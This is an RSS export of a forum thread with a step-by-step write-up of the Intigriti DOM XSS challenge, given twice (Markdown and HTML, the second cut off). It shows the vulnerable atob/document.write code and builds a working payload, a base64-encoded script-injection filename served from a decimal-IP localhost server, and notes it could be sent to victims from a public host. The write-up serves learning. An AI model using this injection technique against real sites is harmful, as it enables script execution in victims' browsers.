<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Intigriti XSS Challenge - Solution</title>
    <link>https://0x00sec.org/t/intigriti-xss-challenge-solution/13896</link>
    <description>Hey there 0x00sec! :wave:

As promised, here is the solution for the latest XSS challenge made by Intigriti. 

The challenge can be found here: https://challenge.intigriti.io/2
The original tweet: https://twitter.com/intigriti/status/1130788256285679618

I will try to make this write up as understandable as possible for all levels! So if you think that the challenge was too difficult and that you need to learn a lot before trying/understanding something like this, don&#39;t worry! I will follow the steps I took when solving it in detail. I will add url links that you can interact with and see what I saw (errors) when trying to solve it. Don&#39;t forget to reproduce all steps or the final link (with the actual XSS payload) won&#39;t work!

# Understanding the code

We will start by taking a look at the code. There are only 16 lines of code, so bear with me:

```
(1) if(window.location.hash == &quot;&quot;)
        window.location.hash = &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;;

(2) var b64img = window.location.hash.substr(1);
    var xhttp = new XMLHttpRequest();
    
(3) xhttp.onreadystatechange = function() {
        if (this.readyState == 4 &amp;&amp; this.status == 200) {
            var reader = new FileReader();
            reader.onloadend = function() {
            document.write(`
                &lt;a href=&quot;${b64img}&quot; alt=&quot;${atob(
                &lt;img src=&quot;${reader.result}&quot;&gt;
                &lt;/a&gt;`);
            }
            reader.readAsDataURL(this.response);
        }
    };

(4) xhttp.responseType = &#39;blob&#39;;
    xhttp.open(&quot;GET&quot;, b64img, true);
    xhttp.send();
```

Let&#39;s break it down into parts (numbers):

```
(1) if(window.location.hash == &quot;&quot;)
        window.location.hash = &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;;
```

This initial script only checks if the fragment identifier of the URL is empty. In that case, it adds the default string ` &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;`. If you have been playing a lot of CTFs, you should have seen right off the bat that this string is a Base64 encoded String. The two `&#39;=&#39;` at the end give as a big hint. The decoded string is: `&#39;intigriti-challenge&#39;`. The URL that results after appending this B64 string is: https://challenge.intigriti.io/2/#aW50aWdyaXRpLWNoYWxsZW5nZQ==.

```
(2) var b64img = window.location.hash.substr(1);
    var xhttp = new XMLHttpRequest();
```
We now start with the main script. The first line gets the fragment identifier from the URL, removing the intial `&#39;#&#39;`. By default, `b64img = &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;`.
The second line initializes an `XMLHttpRequest` that will be used.

```
(3) xhttp.onreadystatechange = function() {
        if (this.readyState == 4 &amp;&amp; this.status == 200) {
            var reader = new FileReader();
            reader.onloadend = function() {
            document.write(`
                &lt;a href=&quot;${b64img}&quot; alt=&quot;${atob(b64img)}&quot;&gt;
                    &lt;img src=&quot;${reader.result}&quot;&gt;
                &lt;/a&gt;`);
            }
            reader.readAsDataURL(this.response);
        }
    };
```
We are then presented with the vulnerable code. The script assigns a function to `xhttp` that will ***execute only*** if `readyState == 4` and `status == 200`. This means that the code will only run when the request finishes and the status code is `200 OK`.

When this happens, a new `FileReader()` is used to read the response. When the `reader` finishes &quot;reading&quot;, the function assigned to `onloadend` will execute, which then writes a new html tag to the document:
```
&lt;a href=&quot;${b64img}&quot; alt=&quot;${atob(b64img)}&quot;&gt;
    &lt;img src=&quot;${reader.result}&quot;&gt;
&lt;/a&gt;`);
```
This will be an `a` tag with `href=&quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;` by default. The alternate text assigned to this tag will be `atob(&quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;)`, which (as we&#39;ve already seen) results into `&quot;intigriti-challenge&quot;`. Inside the `a` tag, an image is inserted with the response contents.
```
(4) xhttp.responseType = &#39;blob&#39;;
    xhttp.open(&quot;GET&quot;, b64img, true);
    xhttp.send();
```
The final lines of the script start the actual request. It sends a `GET` request to `b64img`. Since `b64img` is `aW50aWdyaXRpLWNoYWxsZW5nZQ==` by default, the resulting request is: https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==

Which downloads the default image.

After this summary, we can understand why we see the image loaded by default. The steps your browser follows when you enter https://challenge.intigriti.io/2 are:

1. The default fragment identifier is assigned: &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;
2. The `xhttp` fires the request to `b64img` (https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==)
3. If the request succeeds, a new image is inserted with the response contents. The `alt` attribute of the `a` tag containing the image is the result of executing `atob(b64img) `.

# What do we have control over?

What do we control as attackers? What can we manipulate? You guessed it: **the fragment identifier**. We can modify the fragment identifier and start poking the script to see what happens when an invalid/malformed/unexpected fragment identifier is passed.

Since we now have a clear understanding of the code, we can start poking with something that makes sense: a valid URL path. 

What happens if we try a random url? Say, google: https://challenge.intigriti.io/2#https://www.google.com

It doesn&#39;t work because of CORS policy, as expected. What happens if we try with a server that accepts Cross-Origin requests? You can use https://cors-test.appspot.com/test to make cors requests, it will respond with status `200 OK`. Thus, our new URL will be: http://challenge.intigriti.io/2/#https://cors-test.appspot.com/test

This time also fails, but the error is different:
![xss_3|690x48,100%](upload://uWFDesziJIIudF5DB6QJ495CVE2.jpeg) 

This indicates us that `atob` failed to decode the string passed, which is `b64img=&quot;https://cors-test.appspot.com/test&quot;`. Obviously, it won&#39;t work, since it contains invalid base 64 characters.

Ok, let&#39;s back up a little. What else can we try? We can try with relative paths. This actually makes sense, since relative paths doesn&#39;t contain invalid base64 characters, and we know that CORS won&#39;t bother us. 

What paths do we know exist in the server? Well, there are only 2:

1. `/2` - This is the URL path of the challenge per se. 
2. `/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==` - This is the URL path of the default image loaded

Let&#39;s start with the first one: https://challenge.intigriti.io/2#/2

The resulting web page will look like this:

![xss_1|374x125,75%](upload://ryZq89pmtohtKwWeyFN0NCFZHcW.jpeg) 

Whoa! What happened? Let&#39;s look at the html generated using developer tools (F12 in google chrome):
```
&lt;a href=&quot;/2&quot; alt=&quot;ÿ&quot;&gt;
    &lt;img src=&quot;data:text/html;base64,PHNjcmlwdD4KICBpZih3aW5kb3cubG9...&quot;&gt;
&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
```
As we expected, `href=&quot;/2&quot;`, since the code specifies that `href=${b64img}`, and `b64img=&quot;/2&quot;`.

The `alt` attribute is `&quot;ÿ&quot;`. Huh? Well, the code specifies that `alt=${atob(b64img)}`. What happens if you execute `atob(&quot;/2&quot;)` in the console of your browser? Exactly, `&quot;ÿ&quot;` is returned. Since `&quot;/2&quot;` is a string that contains valid base 64 characters, `atob` executes correctly and returns the decoded string.

But what is this `&quot;data:text/html;base64,PHNjcmlwdD4KICBpZih3aW5kb3cubG9...&quot;` assigned to `src` of the image? Well, let&#39;s decode it:

```
&lt;script&gt;
  if(window.location.hash == &quot;&quot;)
    window.location.hash = &quot;aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;;
&lt;/script&gt;
&lt;!--
  &lt;CHALLENGE&gt;
  Tip: Bruteforce won&#39;t help you!
--&gt;
&lt;script&gt;
var b64img = window.location.hash.substr(1);
...
```

That&#39;s the actual html of the challenge!! The script scpecifies that `src=&quot;${reader.result}&quot;`, and since we are reading the path `/2`, the html code is treated as the image, even though it isn&#39;t. That&#39;s why there is no image in the actual page and we are presented with the default error image.

What happens now if we try the second path we know about:  https://challenge.intigriti.io/2#/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==

Whaat? There is no image this time:

![xss_2|635x116,75%](upload://xdipm4WxTjPMhWyFmt74eYhwlf0.jpeg) 

Hmmm... It seems `atob` failed to execute. But why? We know that this time `b64img=&quot;/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;`, and is composed of valid b64 characters. Why did it fail? Well, if you search the web you will find that `atob` usually expects a Base64 string with even length (because of how B64 works), so we will have to add padding. Let&#39;s try running `atob` in the console, but adding a valid character to the string:

```
&gt; atob(&quot;//2/aW50aWdyaXRpLWNoYWxsZW5nZQ==&quot;)
        ^
        added &#39;/&#39; to the start of the string to make it even
&lt;· &quot;ÿý¿intigriti-challenge&quot;
```
It worked! What happens now if we use this new URL path? https://challenge.intigriti.io/2#//2/aW50aWdyaXRpLWNoYWxsZW5nZQ==

It fails! But look at the error we get:
```
(index):26 GET https://0.0.0.2/aW50aWdyaXRpLWNoYWxsZW5nZQ== net::ERR_ADDRESS_UNREACHABLE
```

Notice how the line 26 of the code is failing this time. That&#39;s the `xhttp.send()` line. It seems that now is failing because the URL is not valid. What URL is trying to access?

```
https://0.0.0.2/aW50aWdyaXRpLWNoYWxsZW5nZQ==
```

What the * is this? Well, if you search the web again for this, you will find that passing a string starting with `&quot;//&quot;` to `XmlHttpRequest` is equivalent to passing `https://`, but omiting the initial `https:` part. Huh, that&#39;s interesting... In our example, it treated the `//2/` as the IP address of the server, so that `2` becomes `0.0.0.2`. What happens if we try something like... I don&#39;t know, localhost?

# Solving the Challenge

For that, we first need to start a localhost http server. We can use python in one line:
```
$ sudo python -m SimpleHTTPServer 80
```
*Sidenote: we have to use port 80. If we used the default 8000 port, we would have to specify it in the IP address like this &#39;`ip_address:80`&#39;. Since `&#39;:&#39;` is not a valid B64 character, `atob` would fail.*

Let&#39;s try again. We have to translate `127.0.0.1` (localhost) to decimal: `2130706433`.
The resulting url will be: https://challenge.intigriti.io/2#//2130706433

We get an error because we are trying to access `http` (localhost) from `https` (server). Let&#39;s try again using `http` instead:
http://challenge.intigriti.io/2#//2130706433

Hmmm... We now face the CORS problem again. No worries! Since we are the owners of our server running in localhost, we can enable CORS. I found it too cumbersome to activate cors using python, so instead I used `http-server` from `npm`. You can install it using: `npm install -g http-server`. Be sure to stop the previous python server before starting this one!

```
$ npm install -g http-server
$ http-server --cors -p 80
```

We now have a running localhost server with CORS enabled. To make this example more fun, we will add an image to our localhost server and access it. The image I used is the 0x00sec logo. Add your image to the root directory of your localhost server. Name it whatever you want, but ***REMEMBER***! don&#39;t use any invalid base64 characters, or `atob` will fail. I named my image `0x00sec`. Let&#39;s try again using our image path: http://challenge.intigriti.io/2#//2130706433/0x00sec

![xss_4|475x500,75%](upload://4Ay5hDEVIiqvJIZW8B5WGbaaD3d.jpeg) 

Hell yeah!!!! It worked! The request returned a `200 OK` code, which triggered the code that reads the response (our 0x00sec image), which eventually inserts it into the DOM as an `img`.

But the challenge asked for a DOM XSS vulnerability! We have to execute JS code in the browser. Let&#39;s see, how can we achieve it? Let&#39;s inspect the vulnerable code again:

```
&lt;a href=&quot;${b64img}&quot; alt=&quot;${atob(b64img)}&quot;&gt;
    &lt;img src=&quot;${reader.result}&quot;&gt;
&lt;/a&gt;`);
```

The `alt` attribute uses the output of `atob(b64img)` and inserts it into the DOM. In the previous example, the `alt` tag was: `atob(&quot;//2130706433/0x00sec&quot;) = &quot;ÿýµßNôë÷ÿLtÒÇ&quot;`. Hmmm... What would happen if the output of `atob` resulted in html code? Let&#39;s try it! The challenge asks us to execute the following code:

```
alert(document.domain)
```
Thus, the output of `atob` will have to look something like this:
```
&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```
Why??? (you should ask) Well, because this would then be inserted in `alt`. The resulting html code would look like this:
```
&lt;a href=&quot;${b64img}&quot; alt=&quot;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;&gt;
    &lt;img src=&quot;${reader.result}&quot;&gt;
&lt;/a&gt;
```

See what I did there? ;) 

The last thing remaining is to generate a B64 string that, when decoded, would generate the string mentioned. Using any B64 encoder we get:

```
Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=
```

Let&#39;s try to rename our 0x00sec image file to this name. The resulting url will be:
http://challenge.intigriti.io/2#//2130706433/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=

Hmmm... we got the `atob` error again, but we know how to solve it!! We just have to pad the string to a valid length. Let&#39;s try adding a subdirectory to our server root dir:
```
http://challenge.intigriti.io/2#//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=
                                            ^^^
```

We then save the renamed 0x00sec image inside the `/aa/` directory. Let&#39;s try it again! 

http://challenge.intigriti.io/2#//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=

![xss_5|690x358](upload://cnsMj47FlDQqSIZJcCO73JCivWF.jpeg) 

And there you have it! We successfully injected and executed JS code into the web page. We can check the html code generated to confirm this:
```
&lt;a href=&quot;//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=&quot; alt=&quot;ÿýµßNôë÷ý¦¿&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;&amp;gt;
    &lt;img src=&quot;data:application/octet-stream;base64, iVBORw0KGgoAAAANSUhEUgAAA...&quot;&gt;
&lt;/a&gt;
```

There it is! This type of XSS is known as DOM XSS. You can read more about XSS and different types of XSS [here](https://excess-xss.com).

But why would this challenge be of any harm if it were to happen in the wild? How could hackers attack it? Well, it would be as easy as creating your own public server, accessible from anywhere. Once you accomplished that, you could send the infectious URL containing the XSS payload (*with your server address, not localhost!*) to anyone.

Phew! That was it! I really enjoyed solving it and I&#39;m looking forward to future challenges. I hope this write-up makes sense! Feel free to comment/ask/suggest anything in the comments section :slight_smile:

See you around,
~hasp0t</description>
    
    <lastBuildDate>Sun, 26 May 2019 05:48:36 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Intigriti XSS Challenge - Solution</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/3</link>
        <pubDate>Mon, 24 Jun 2019 14:47:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13896-3</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896.rss">Intigriti XSS Challenge - Solution</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge - Solution</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Man, this was a trip!</p>
<p>Really is an interesting XSS method, thanks for the writeup and going over this! I’m getting vague memories of how SQLi esq this is with the <code>"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> payload.</p>
<p>Good job man! Look forward to more web stuff <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/2</link>
        <pubDate>Sun, 26 May 2019 05:48:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13896-2</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896.rss">Intigriti XSS Challenge - Solution</source>
      </item>
      <item>
        <title>Intigriti XSS Challenge - Solution</title>
        <dc:creator><![CDATA[hasp0t]]></dc:creator>
        <description><![CDATA[
            <p>Hey there 0x00sec! <img src="https://0x00sec.org/images/emoji/twitter/wave.png?v=9" title=":wave:" class="emoji" alt=":wave:"></p>
<p>As promised, here is the solution for the latest XSS challenge made by Intigriti.</p>
<p>The challenge can be found here: <a href="https://challenge.intigriti.io/2" rel="noopener nofollow ugc">https://challenge.intigriti.io/2</a><br>
The original tweet: <a href="https://twitter.com/intigriti/status/1130788256285679618" rel="noopener nofollow ugc">https://twitter.com/intigriti/status/1130788256285679618</a></p>
<p>I will try to make this write up as understandable as possible for all levels! So if you think that the challenge was too difficult and that you need to learn a lot before trying/understanding something like this, don’t worry! I will follow the steps I took when solving it in detail. I will add url links that you can interact with and see what I saw (errors) when trying to solve it. Don’t forget to reproduce all steps or the final link (with the actual XSS payload) won’t work!</p>
<h1>Understanding the code</h1>
<p>We will start by taking a look at the code. There are only 16 lines of code, so bear with me:</p>
<pre><code class="lang-auto">(1) if(window.location.hash == "")
        window.location.hash = "aW50aWdyaXRpLWNoYWxsZW5nZQ==";

(2) var b64img = window.location.hash.substr(1);
    var xhttp = new XMLHttpRequest();
    
(3) xhttp.onreadystatechange = function() {
        if (this.readyState == 4 &amp;&amp; this.status == 200) {
            var reader = new FileReader();
            reader.onloadend = function() {
            document.write(`
                &lt;a href="${b64img}" alt="${atob(
                &lt;img src="${reader.result}"&gt;
                &lt;/a&gt;`);
            }
            reader.readAsDataURL(this.response);
        }
    };

(4) xhttp.responseType = 'blob';
    xhttp.open("GET", b64img, true);
    xhttp.send();
</code></pre>
<p>Let’s break it down into parts (numbers):</p>
<pre><code class="lang-auto">(1) if(window.location.hash == "")
        window.location.hash = "aW50aWdyaXRpLWNoYWxsZW5nZQ==";
</code></pre>
<p>This initial script only checks if the fragment identifier of the URL is empty. In that case, it adds the default string <code> "aW50aWdyaXRpLWNoYWxsZW5nZQ=="</code>. If you have been playing a lot of CTFs, you should have seen right off the bat that this string is a Base64 encoded String. The two <code>'='</code> at the end give as a big hint. The decoded string is: <code>'intigriti-challenge'</code>. The URL that results after appending this B64 string is: <a href="https://challenge.intigriti.io/2/#aW50aWdyaXRpLWNoYWxsZW5nZQ==" rel="noopener nofollow ugc">https://challenge.intigriti.io/2/#aW50aWdyaXRpLWNoYWxsZW5nZQ==</a>.</p>
<pre><code class="lang-auto">(2) var b64img = window.location.hash.substr(1);
    var xhttp = new XMLHttpRequest();
</code></pre>
<p>We now start with the main script. The first line gets the fragment identifier from the URL, removing the intial <code>'#'</code>. By default, <code>b64img = "aW50aWdyaXRpLWNoYWxsZW5nZQ=="</code>.<br>
The second line initializes an <code>XMLHttpRequest</code> that will be used.</p>
<pre><code class="lang-auto">(3) xhttp.onreadystatechange = function() {
        if (this.readyState == 4 &amp;&amp; this.status == 200) {
            var reader = new FileReader();
            reader.onloadend = function() {
            document.write(`
                &lt;a href="${b64img}" alt="${atob(b64img)}"&gt;
                    &lt;img src="${reader.result}"&gt;
                &lt;/a&gt;`);
            }
            reader.readAsDataURL(this.response);
        }
    };
</code></pre>
<p>We are then presented with the vulnerable code. The script assigns a function to <code>xhttp</code> that will <em><strong>execute only</strong></em> if <code>readyState == 4</code> and <code>status == 200</code>. This means that the code will only run when the request finishes and the status code is <code>200 OK</code>.</p>
<p>When this happens, a new <code>FileReader()</code> is used to read the response. When the <code>reader</code> finishes “reading”, the function assigned to <code>onloadend</code> will execute, which then writes a new html tag to the document:</p>
<pre><code class="lang-auto">&lt;a href="${b64img}" alt="${atob(b64img)}"&gt;
    &lt;img src="${reader.result}"&gt;
&lt;/a&gt;`);
</code></pre>
<p>This will be an <code>a</code> tag with <code>href="aW50aWdyaXRpLWNoYWxsZW5nZQ=="</code> by default. The alternate text assigned to this tag will be <code>atob("aW50aWdyaXRpLWNoYWxsZW5nZQ==")</code>, which (as we’ve already seen) results into <code>"intigriti-challenge"</code>. Inside the <code>a</code> tag, an image is inserted with the response contents.</p>
<pre><code class="lang-auto">(4) xhttp.responseType = 'blob';
    xhttp.open("GET", b64img, true);
    xhttp.send();
</code></pre>
<p>The final lines of the script start the actual request. It sends a <code>GET</code> request to <code>b64img</code>. Since <code>b64img</code> is <code>aW50aWdyaXRpLWNoYWxsZW5nZQ==</code> by default, the resulting request is: <a href="https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==" rel="noopener nofollow ugc">https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==</a></p>
<p>Which downloads the default image.</p>
<p>After this summary, we can understand why we see the image loaded by default. The steps your browser follows when you enter <a href="https://challenge.intigriti.io/2" rel="noopener nofollow ugc">https://challenge.intigriti.io/2</a> are:</p>
<ol>
<li>The default fragment identifier is assigned: “aW50aWdyaXRpLWNoYWxsZW5nZQ==”</li>
<li>The <code>xhttp</code> fires the request to <code>b64img</code> (<a href="https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==" rel="noopener nofollow ugc">https://challenge.intigriti.io/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==</a>)</li>
<li>If the request succeeds, a new image is inserted with the response contents. The <code>alt</code> attribute of the <code>a</code> tag containing the image is the result of executing <code>atob(b64img) </code>.</li>
</ol>
<h1>What do we have control over?</h1>
<p>What do we control as attackers? What can we manipulate? You guessed it: <strong>the fragment identifier</strong>. We can modify the fragment identifier and start poking the script to see what happens when an invalid/malformed/unexpected fragment identifier is passed.</p>
<p>Since we now have a clear understanding of the code, we can start poking with something that makes sense: a valid URL path.</p>
<p>What happens if we try a random url? Say, google: <a href="https://challenge.intigriti.io/2#https://www.google.com" rel="noopener nofollow ugc">https://challenge.intigriti.io/2#https://www.google.com</a></p>
<p>It doesn’t work because of CORS policy, as expected. What happens if we try with a server that accepts Cross-Origin requests? You can use <a href="https://cors-test.appspot.com/test" rel="noopener nofollow ugc">https://cors-test.appspot.com/test</a> to make cors requests, it will respond with status <code>200 OK</code>. Thus, our new URL will be: <a href="http://challenge.intigriti.io/2/#https://cors-test.appspot.com/test" rel="noopener nofollow ugc">http://challenge.intigriti.io/2/#https://cors-test.appspot.com/test</a></p>
<p>This time also fails, but the error is different:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d8e312643810d3ff778c306e21cfe3b45e35ec16.jpeg" alt="xss_3" data-base62-sha1="uWFDesziJIIudF5DB6QJ495CVE2" width="690" height="48"></p>
<p>This indicates us that <code>atob</code> failed to decode the string passed, which is <code>b64img="https://cors-test.appspot.com/test"</code>. Obviously, it won’t work, since it contains invalid base 64 characters.</p>
<p>Ok, let’s back up a little. What else can we try? We can try with relative paths. This actually makes sense, since relative paths doesn’t contain invalid base64 characters, and we know that CORS won’t bother us.</p>
<p>What paths do we know exist in the server? Well, there are only 2:</p>
<ol>
<li>
<code>/2</code> - This is the URL path of the challenge per se.</li>
<li>
<code>/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==</code> - This is the URL path of the default image loaded</li>
</ol>
<p>Let’s start with the first one: <a href="https://challenge.intigriti.io/2#/2" rel="noopener nofollow ugc">https://challenge.intigriti.io/2#/2</a></p>
<p>The resulting web page will look like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c12f446c6a4a2cc55138ab2df4760756a7543ef6.jpeg" alt="xss_1" data-base62-sha1="ryZq89pmtohtKwWeyFN0NCFZHcW" width="280" height="93"></p>
<p>Whoa! What happened? Let’s look at the html generated using developer tools (F12 in google chrome):</p>
<pre><code class="lang-auto">&lt;a href="/2" alt="ÿ"&gt;
    &lt;img src="data:text/html;base64,PHNjcmlwdD4KICBpZih3aW5kb3cubG9..."&gt;
&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>As we expected, <code>href="/2"</code>, since the code specifies that <code>href=${b64img}</code>, and <code>b64img="/2"</code>.</p>
<p>The <code>alt</code> attribute is <code>"ÿ"</code>. Huh? Well, the code specifies that <code>alt=${atob(b64img)}</code>. What happens if you execute <code>atob("/2")</code> in the console of your browser? Exactly, <code>"ÿ"</code> is returned. Since <code>"/2"</code> is a string that contains valid base 64 characters, <code>atob</code> executes correctly and returns the decoded string.</p>
<p>But what is this <code>"data:text/html;base64,PHNjcmlwdD4KICBpZih3aW5kb3cubG9..."</code> assigned to <code>src</code> of the image? Well, let’s decode it:</p>
<pre><code class="lang-auto">&lt;script&gt;
  if(window.location.hash == "")
    window.location.hash = "aW50aWdyaXRpLWNoYWxsZW5nZQ==";
&lt;/script&gt;
&lt;!--
  &lt;CHALLENGE&gt;
  Tip: Bruteforce won't help you!
--&gt;
&lt;script&gt;
var b64img = window.location.hash.substr(1);
...
</code></pre>
<p>That’s the actual html of the challenge!! The script scpecifies that <code>src="${reader.result}"</code>, and since we are reading the path <code>/2</code>, the html code is treated as the image, even though it isn’t. That’s why there is no image in the actual page and we are presented with the default error image.</p>
<p>What happens now if we try the second path we know about:  <a href="https://challenge.intigriti.io/2#/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==" rel="noopener nofollow ugc">https://challenge.intigriti.io/2#/2/aW50aWdyaXRpLWNoYWxsZW5nZQ==</a></p>
<p>Whaat? There is no image this time:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e8c887f3e25b945732a802dbc8d394e0dabe9e06.jpeg" alt="xss_2" data-base62-sha1="xdipm4WxTjPMhWyFmt74eYhwlf0" width="476" height="87"></p>
<p>Hmmm… It seems <code>atob</code> failed to execute. But why? We know that this time <code>b64img="/2/aW50aWdyaXRpLWNoYWxsZW5nZQ=="</code>, and is composed of valid b64 characters. Why did it fail? Well, if you search the web you will find that <code>atob</code> usually expects a Base64 string with even length (because of how B64 works), so we will have to add padding. Let’s try running <code>atob</code> in the console, but adding a valid character to the string:</p>
<pre><code class="lang-auto">&gt; atob("//2/aW50aWdyaXRpLWNoYWxsZW5nZQ==")
        ^
        added '/' to the start of the string to make it even
&lt;· "ÿý¿intigriti-challenge"
</code></pre>
<p>It worked! What happens now if we use this new URL path? <a href="https://challenge.intigriti.io/2#//2/aW50aWdyaXRpLWNoYWxsZW5nZQ==" rel="noopener nofollow ugc">https://challenge.intigriti.io/2#//2/aW50aWdyaXRpLWNoYWxsZW5nZQ==</a></p>
<p>It fails! But look at the error we get:</p>
<pre><code class="lang-auto">(index):26 GET https://0.0.0.2/aW50aWdyaXRpLWNoYWxsZW5nZQ== net::ERR_ADDRESS_UNREACHABLE
</code></pre>
<p>Notice how the line 26 of the code is failing this time. That’s the <code>xhttp.send()</code> line. It seems that now is failing because the URL is not valid. What URL is trying to access?</p>
<pre><code class="lang-auto">https://0.0.0.2/aW50aWdyaXRpLWNoYWxsZW5nZQ==
</code></pre>
<p>What the * is this? Well, if you search the web again for this, you will find that passing a string starting with <code>"//"</code> to <code>XmlHttpRequest</code> is equivalent to passing <code>https://</code>, but omiting the initial <code>https:</code> part. Huh, that’s interesting… In our example, it treated the <code>//2/</code> as the IP address of the server, so that <code>2</code> becomes <code>0.0.0.2</code>. What happens if we try something like… I don’t know, localhost?</p>
<h1>Solving the Challenge</h1>
<p>For that, we first need to start a localhost http server. We can use python in one line:</p>
<pre><code class="lang-auto">$ sudo python -m SimpleHTTPServer 80
</code></pre>
<p><em>Sidenote: we have to use port 80. If we used the default 8000 port, we would have to specify it in the IP address like this ‘<code>ip_address:80</code>’. Since <code>':'</code> is not a valid B64 character, <code>atob</code> would fail.</em></p>
<p>Let’s try again. We have to translate <code>127.0.0.1</code> (localhost) to decimal: <code>2130706433</code>.<br>
The resulting url will be: <a href="https://challenge.intigriti.io/2#//2130706433" rel="noopener nofollow ugc">https://challenge.intigriti.io/2#//2130706433</a></p>
<p>We get an error because we are trying to access <code>http</code> (localhost) from <code>https</code> (server). Let’s try again using <code>http</code> instead:<br>
<a href="http://challenge.intigriti.io/2#//2130706433" class="onebox" target="_blank" rel="noopener nofollow ugc">http://challenge.intigriti.io/2#//2130706433</a></p>
<p>Hmmm… We now face the CORS problem again. No worries! Since we are the owners of our server running in localhost, we can enable CORS. I found it too cumbersome to activate cors using python, so instead I used <code>http-server</code> from <code>npm</code>. You can install it using: <code>npm install -g http-server</code>. Be sure to stop the previous python server before starting this one!</p>
<pre><code class="lang-auto">$ npm install -g http-server
$ http-server --cors -p 80
</code></pre>
<p>We now have a running localhost server with CORS enabled. To make this example more fun, we will add an image to our localhost server and access it. The image I used is the 0x00sec logo. Add your image to the root directory of your localhost server. Name it whatever you want, but <em><strong>REMEMBER</strong></em>! don’t use any invalid base64 characters, or <code>atob</code> will fail. I named my image <code>0x00sec</code>. Let’s try again using our image path: <a href="http://challenge.intigriti.io/2#//2130706433/0x00sec" rel="noopener nofollow ugc">http://challenge.intigriti.io/2#//2130706433/0x00sec</a></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/202a622b849fce4b47347c3fc5bcc3ac8be4fbd3.jpeg" alt="xss_4" data-base62-sha1="4Ay5hDEVIiqvJIZW8B5WGbaaD3d" width="356" height="375"></p>
<p>Hell yeah!!! It worked! The request returned a <code>200 OK</code> code, which triggered the code that reads the response (our 0x00sec image), which eventually inserts it into the DOM as an <code>img</code>.</p>
<p>But the challenge asked for a DOM XSS vulnerability! We have to execute JS code in the browser. Let’s see, how can we achieve it? Let’s inspect the vulnerable code again:</p>
<pre><code class="lang-auto">&lt;a href="${b64img}" alt="${atob(b64img)}"&gt;
    &lt;img src="${reader.result}"&gt;
&lt;/a&gt;`);
</code></pre>
<p>The <code>alt</code> attribute uses the output of <code>atob(b64img)</code> and inserts it into the DOM. In the previous example, the <code>alt</code> tag was: <code>atob("//2130706433/0x00sec") = "ÿýµßNôë÷ÿLtÒÇ"</code>. Hmmm… What would happen if the output of <code>atob</code> resulted in html code? Let’s try it! The challenge asks us to execute the following code:</p>
<pre><code class="lang-auto">alert(document.domain)
</code></pre>
<p>Thus, the output of <code>atob</code> will have to look something like this:</p>
<pre><code class="lang-auto">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre>
<p>Why??? (you should ask) Well, because this would then be inserted in <code>alt</code>. The resulting html code would look like this:</p>
<pre><code class="lang-auto">&lt;a href="${b64img}" alt=""&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;
    &lt;img src="${reader.result}"&gt;
